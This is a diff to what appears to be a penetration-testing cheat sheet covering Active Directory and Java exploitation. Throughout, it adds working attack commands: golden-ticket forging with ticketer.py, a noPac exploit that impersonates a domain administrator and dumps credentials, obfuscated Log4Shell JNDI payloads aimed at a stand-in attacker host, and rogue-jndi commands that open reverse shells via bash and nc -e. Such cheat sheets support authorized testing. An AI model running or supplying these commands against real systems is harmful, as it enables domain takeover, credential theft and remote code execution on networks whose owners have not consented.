@@ -2055,7 +2055,7 @@ $ mssqlclient.py  -windows-auth bank.local/aniq:'Password@123'@10.10.10.10
 => ticketConverter.py
 $ ticketConverter.py cifs.kirbi cifs.ccache
 
-=> ticketer.py 
+=> ticketer.py (Golden Tick)
 $ ticketer.py -domain bank.local -nthash <KRBTGT_HASH> -dc-ip 10.10.10.10 -domain-sid <DOMAIN_SID> <USER>
 $ ticketer.py -domain bank.local -nthash 4e48ce125611add31a32cd79e529964b -dc-ip 10.10.10.10 -domain-sid S-1-5-21-3750359090-2939318659-876128439 lolol
 
@@ -3533,16 +3533,29 @@ $ https://nv2lt.github.io/windows/CVE-2020-1472-Step-by-Step-Procedure/
 
 ```
 
+### NoPac (CVE-2021-42278 & CVE-2021-42287)
+
+```bash
+=> GitHub
+$ https://github.com/Ridter/noPac
+
+=> Commands
+$ python3 .\noPac.py bank.local/user:password -dc-ip 10.0.10.10 -dc-host DC01 --impersonate administrator -dump
+
+=> References
+$ https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing
+```
+
 ###  Log4J
 
 ```bash
-# Marshalsec
-git clone https://github.com/mbechler/marshalsec.git
-cd marshalsec
-sudo apt install maven
-mvn clean package -DskipTests
+=> Marshalsec
+$ git clone https://github.com/mbechler/marshalsec.git
+$ cd marshalsec
+$ sudo apt install maven
+$ mvn clean package -DskipTests
 
-# Payload
+=> Payload
 ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
 ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
@@ -3559,12 +3572,18 @@ ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
 ${jndi:ldap://ATTACKERCONTROLLEDHOST}
 ${jndi:rmi://adsasd.asdasd.asdasd}
 
+=> Exploit (1)
+$ https://github.com/veracode-research/rogue-jndi
+$ java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}" --httpPort 8888 --hostname 10.10.10.10
+$ java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "nc -e /bin/sh 10.10.10.10 1337" --httpPort 8888 --hostname 10.10.10.10
+$ ${jndi:ldap://10.10.10.10/o=tomcat}
 
-# References
-https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/
-https://twitter.com/marcioalm/status/1470361495405875200?s=20
-https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
-https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
+=> References
+$ https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/
+$ https://twitter.com/marcioalm/status/1470361495405875200?s=20
+$ https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
+$ https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
+$ https://www.sprocketsecurity.com/blog/how-to-exploit-log4j-vulnerabilities-in-vmware-vcenter
 ```
 
 ### ShellShock
@@ -3999,7 +4018,7 @@ set rhosts 10.10.10.10
 https://github.com/afwu/PrintNightmare
 
 # Check If vulnerable (If Got Values)
-rpcdump.py @10.10.120.242 | egrep 'MS-RPRN|MS-PAR
+rpcdump.py @10.10.120.242 | egrep 'MS-RPRN|MS-PAR'
 
 # Sysmon (Look into)
 - Event 11 -> spoolsv.exe Writing
